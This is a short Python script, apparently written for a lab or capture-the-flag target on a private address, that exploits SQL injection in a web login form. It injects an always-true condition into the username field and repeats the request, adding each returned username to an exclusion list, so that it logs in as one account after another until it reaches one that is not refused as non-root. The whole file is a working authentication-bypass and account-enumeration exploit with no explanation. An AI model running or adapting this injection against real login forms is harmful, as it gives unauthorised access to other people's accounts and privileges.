import requests


name = '('
while True:
    data = {
        'username': "jhon' or 'a' == 'a' and username not in "+ name +");--",
        'password': 'admin'
    }
    response = requests.post(
        'http://10.51.1.198:7631/login',
        data=data
    )
    # print(response.text.split('Welcome, ')[1].split('!')[0].lower())
    # print(response.text.split('Welcome, '))
    print(response.text.split('Welcome, ')[1].split('!')[0].lower())
    if name == '(':
        name += "'" + response.text.split('Welcome, ')[1].split('!')[0].lower() + "'"
    else:
        name += ",'" + response.text.split('Welcome, ')[1].split('!')[0].lower() + "'"
    if response.text.find("You're not root") == -1:
        print(response.text)
        break